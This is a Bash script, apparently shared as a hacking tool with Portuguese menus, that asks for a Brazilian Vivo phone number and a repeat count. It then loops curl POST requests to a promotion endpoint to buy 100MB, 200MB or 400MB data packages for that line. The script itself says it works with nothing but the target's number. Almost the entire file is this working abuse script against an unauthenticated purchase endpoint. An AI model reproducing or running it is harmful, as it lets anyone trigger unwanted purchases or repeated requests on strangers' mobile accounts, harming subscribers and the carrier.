#!/bin/bash
clear
MSGS=("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿
⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿
⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿
⣭⣍⠛⠿⠄⢰⠋⡉⠹⣿⣿⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣿⡟⢁⠙⡆⢡⣿⣿⣿
⠻⣿⡆⠄⣤⠈⢣⣈⣠⣿⣿⣿⣿⣿⠏⣄⠻⣿⣿⣿⣿⣿⣆⣈⣴⠃⣿⣿⣿⣿
⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋
⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸")
MSG=${MSGS[$RANDOM % ${#MSGS[@]} ]}
echo -e "$MSG"
echo ""
sleep 2
echo -e "\e[00;33;01mESTA É UMA FERRAMENTA APENAS PARA PROFISSIONAIS, LEIA \nDESCRIÇÃO ANTES DE BAIXAR\033[0m"
sleep 3
echo -e "\e[00;33;01mSE VOCÊ NÃO SE ACHA CAPAZ DE USAR, DÊ O FORA DAQUI\033[0m"
sleep 2
echo -e "\e[00;33;01mTODA AÇÃO REALIZADA POR VOCÊ, É DE SUA RESPONSABILIDADE\033[0m"
sleep 3
echo -e '\e[00;00;02molá mãe EHISOPENER\e[m'
sleep 1
clear
echo -e "\e[00;33;01mVOCÊ PODERÁ FAZER SOLICITAÇÕES\nDE PACOTES DE MB DIRETAMENTE PARA UM CHIP VIVO\nCOMO SE ESTIVESSE FAZENDO PELO SITE OU APP\nPORÉM PODE FAZER ISSO APENAS TENDO O NÚMERO DA PESSOA\n\n\e[01;32mOPÇÕES COMO: 100MB | 200MB | 400MB\e[m"
sleep 3
echo ""
echo -e "\033[01;37mSELECIONE UMA OPÇÃO:\033[0m"
echo -e "\033[0m\033[01;37m(1) \033[01;32m100MB\033[0m"
echo -e "\033[0m\033[01;37m(2) \033[01;32m200MB\033[0m"
echo -e "\033[0m\033[01;37m(3) \033[01;32m400MB\033[0m"
echo -e "\033[0m\033[01;37m(4) \033[01;32mSAIR, TENHO MEDO DE USAR\033[0m"
read OPTION
case $OPTION in 
        (1) echo -e "\e[00;37;01mDIGITE O NÚMERO DDD+NÚMERO\e[m"
         read NUMERO
         echo -e "\e[00;37;01mREPETIR QUANTAS VEZES? CUIDADO\e[m"
         read VEZES
         echo -e "\033[01;37msend:false,return:true = \033[01;32mSUCESSO NA SOLICITAÇÃO\e[0m"
         for i in $(seq $VEZES);
         do
         echo ""
         echo -e "\e[00;37;01mRESULTADO:...\e[0m"
         data=$"pack=100c&act=buypack&impressionUUID=&ispClickId=&logPack=100mb&telefone=$NUMERO" && site=$"http://navegue.vivo.ddivulga.com/comprar" && curl "${site}" -d "${data}"
         done
         echo ""
         echo -e "\033[01;32mSOLICITAÇÕES FINALIZADAS\e[0m"
         sleep 5
         ;;
        (2) echo -e "\e[00;37;01mDIGITE O NÚMERO DDD+NÚMERO\e[m"
         read NUMERO
         echo -e "\e[00;37;01mREPETIR QUANTAS VEZES? CUIDADO\e[m"
         read VEZES
         echo -e "\033[01;37msend:false,return:true = \033[01;32mSUCESSO NA SOLICITAÇÃO\e[0m"
         for i in $(seq $VEZES);
         do
         echo ""
         echo -e "\e[00;37;01mRESULTADO:...\e[0m"
           data=$"pack=200CPRE&act=buypack&impressionUUID=&ispClickId=&logPack=200cpre&telefone=$NUMERO" && site=$"http://navegue.vivo.ddivulga.com/comprar" && curl "${site}" -d "${data}"
        done
         echo ""
         echo -e "\033[01;32mSOLICITAÇÕES FINALIZADAS\e[0m"
         sleep 5
         ;;
        (3) echo -e "\e[00;37;01mDIGITE O NÚMERO DDD+NÚMERO\e[m"
         read NUMERO
         echo -e "\e[00;37;01mREPETIR QUANTAS VEZES? CUIDADO\e[m"
         read VEZES
         echo -e "\033[01;37msend:false,return:true = \033[01;32mSUCESSO NA SOLICITAÇÃO\e[0m"
         for i in $(seq $VEZES);
         do
         echo ""
         echo -e "\e[00;37;01mRESULTADO:...\e[0m"
           data=$"pack=400c&act=buypack&impressionUUID=&ispClickId=&logPack=400mb_bn&telefone=$NUMERO" && site=$"http://navegue.vivo.ddivulga.com/comprar" && curl "${site}" -d "${data}"
        done
         echo ""
         echo -e "\033[01;32mSOLICITAÇÕES FINALIZADAS\e[0m"
         sleep 5
         ;;
        (4) echo -e "\e[00;33;01mSEM ARREPENDIMENTOS\e[0m"
           sleep 1
           exit
        ;;
        (*) echo -e "\033[1;31mOPCÃO INVÁLIDA!\033[1;37m"
esac
